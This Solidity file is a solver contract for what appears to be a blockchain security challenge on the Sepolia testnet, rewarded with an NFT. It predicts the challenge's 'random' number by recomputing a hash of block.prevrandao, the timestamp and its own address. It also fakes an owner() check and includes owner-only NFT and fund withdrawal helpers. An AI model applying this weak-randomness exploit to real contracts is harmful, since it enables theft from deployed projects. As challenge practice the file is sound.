//SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// this contract constructor arguments: 0xf988ebf9d801f4d3595592490d7ff029e438deca, 0x31801c3e09708549c1b2c9e1cfbf001399a1b9fa
// challenge 5 contract sepolia: 0xf988ebf9d801f4d3595592490d7ff029e438deca
// nft contract address for challenges: 0x31801c3e09708549c1b2c9e1cfbf001399a1b9fa
interface IChallenge {
    function solveChallenge(uint256 guess, string memory yourTwitterHandle) external;
}

interface IERC721 {
    function getTokenCounter() external returns (uint256);

    function balanceOf(address owner) external view returns (uint256 balance);

    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 tokenId);

    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract Solver {
    address isOwner;
    address ownership = address(this);

    IChallenge challengeContract;

    IERC721 public nftContract;
    bool public nftReceived = false;

    string handler = "@SAY_THANK_YOU";

    constructor(address _challengeContract, address _nftContract) {
        isOwner = msg.sender;
        challengeContract = IChallenge(_challengeContract);
        nftContract = IERC721(_nftContract);
    }

    function solve(string memory twitterHandler) public returns (bool) {
        uint256 guessSolve = getWeakRNG();
        (bool success,) = address(challengeContract).call(
            abi.encodeWithSignature("solveChallenge(uint256,string)", guessSolve, twitterHandler)
        );
        return (success);
    }

    function go() external {
        solve(handler);
    }

    function owner() external view returns (address) {
        return ownership;
    }

    function getWeakRNG() public view returns (uint256) {
        uint256 guess =
            uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
        return guess;
    }

    /*//////////////////////////////////////////////////////////////
                              NFT Transfer
    //////////////////////////////////////////////////////////////*/

    function transferNFTToOwner(uint256 tokenId) public {
        require(msg.sender == isOwner, "Only the contract owner can transfer the NFT");

        uint256 balance = nftContract.balanceOf(address(this));
        require(balance > 0, "Contract does not own any NFTs");

        nftContract.transferFrom(address(this), isOwner, tokenId);
    }

    /*//////////////////////////////////////////////////////////////
                                 HELPER
    //////////////////////////////////////////////////////////////*/

    function withdrawDepositFromContract() public {
        require(msg.sender == isOwner, "Only the owner can withdraw funds");
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        nftReceived = true;
        return this.onERC721Received.selector;
    }

    fallback() external {}

    receive() external payable {}
}
